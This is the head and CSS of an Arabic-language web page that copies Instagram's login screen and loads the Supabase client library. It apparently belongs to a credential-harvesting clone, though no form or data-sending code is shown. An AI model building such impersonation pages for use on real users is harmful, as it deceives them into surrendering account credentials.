<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل الدخول • Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      direction: rtl;
    }
    .main-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 350px;
      margin: 20px auto;
    }
    .box {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 30px 40px;
      width: 100%;
      text-align: center;
      margin-bottom: 10px;
    }
    .logo {
      font-family: 'Grand Hotel', cursive, sans-serif;
      font-size: 38px;
      margin-bottom: 30px;
      font-weight: normal;
      color: #262626;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    .input-field {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 8px;
      font-size: 12px;
      margin-bottom: 6px;
      outline: none;
      direction: rtl;
    }
    .input-field:focus {
      border-color: #a8a8a8;
    }
    .btn-login {
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: #ffffff;
      font-weight: 600;
      padding: 7px;
      font-size: 14px;
      cursor: pointer;
      margin-top: 8px;
    }
    .btn-login:disabled {
      background-color: rgba(0, 149, 246, 0.3);
      cursor: default;
    }
    .divider {
      display: flex;
      align-items: center;
      margin: 15px 0;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }
    .divider span {
      padding: 0 15px;
    }
    .fb-login {
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      text-decoration: none;
      margin: 10px 0;
      display: block;
    }
    .forgot-password {
      color: #00376b;
      font-size: 12px;
      text-decoration: none;
      margin-top: 10px;
      display: block;
    }
    .signup-box {
      font-size: 14px;
      color: #262626;
    }
    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
